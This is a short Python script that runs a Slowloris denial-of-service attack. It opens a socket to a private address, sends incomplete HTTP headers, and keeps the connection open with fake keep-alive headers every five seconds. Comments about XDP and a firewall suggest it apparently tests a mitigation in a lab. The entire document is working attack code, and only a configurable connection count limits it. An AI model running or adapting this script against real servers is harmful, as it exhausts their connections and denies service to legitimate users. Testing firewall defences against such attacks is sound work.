import socket
import time
import sys

ip = '10.0.0.254'
port = 8080
num_sockets = 1
sockets = []

print(f"[*] Starting Slowloris attack against {ip}:{port}...")
print(f"[*] Opening {num_sockets} connections...")

# Step 1: Open sockets and send partial headers (never send \r\n\r\n)
for _ in range(num_sockets):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect((ip, port))
        s.send("GET / HTTP/1.1\r\n".encode("utf-8"))
        s.send(f"Host: {ip}\r\n".encode("utf-8"))
        s.send("User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n".encode("utf-8"))
        s.send("Accept-language: en-US,en,q=0.5\r\n".encode("utf-8"))
        sockets.append(s)
    except Exception as e:
        pass

print(f"[+] Successfully opened {len(sockets)} connections.")

# Step 2: Keep the connections alive by sending 1 tiny header every 5 seconds
packet_count = 4 # We sent ~4 packets during handshake/initial headers
while True:
    print(f"[*] Sending tiny keep-alive headers... (Active connections: {len(sockets)})")
    
    for s in list(sockets):
        try:
            # Send a fake header line to keep the web server waiting
            s.send(f"X-Keep-Alive: {time.time()}\r\n".encode("utf-8"))
        except socket.error:
            # If the socket is dead (because XDP dropped it or server closed it)
            sockets.remove(s)
            
    packet_count += 1
    
    if len(sockets) == 0:
        print("[-] All sockets died! The attack was successfully mitigated by the firewall.")
        break
        
    time.sleep(5)
